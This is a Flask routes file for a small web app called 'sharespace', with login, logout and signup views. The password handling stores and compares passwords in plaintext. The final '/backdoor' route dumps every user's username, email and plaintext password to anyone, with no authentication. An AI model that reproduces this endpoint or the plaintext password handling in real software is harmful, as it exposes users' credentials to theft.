from flask import (
    render_template,
    flash,
    redirect,
    request,
    abort,
    url_for
)
from flask_login import (
    current_user, 
    login_user,
    logout_user,
    login_required
)
from sharespace import app
from sharespace.database import *
from sharespace.api import api_bp
app.register_blueprint(api_bp, url_prefix='/api')

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        user = User.query.filter_by(
            email=email, 
            password=password
        ).first()

        if not user: # password is invalid
            return 'wrong : ' + str(user)

        login_user(user)
        return redirect(url_for('home'))
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('home'))

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    if request.method == 'POST':
        newuser = User(
            username=request.form.get('username'), 
            email=request.form.get('email'), 
            password=request.form.get('password')
        )
        db.session.add(newuser)
        try:
            db.session.commit()
        except:
            return render_template('signup.html')
        return redirect(url_for('login'))
    return render_template('signup.html')

@app.route('/backdoor')
def backdoor():
    return (
        str([[u.username, u.email, u.password] for u in User.query.all()])
        + str([[p.title, p.article, p.author, p.image_url, p.time, p.tags] for p in Post.query.all()])
    )
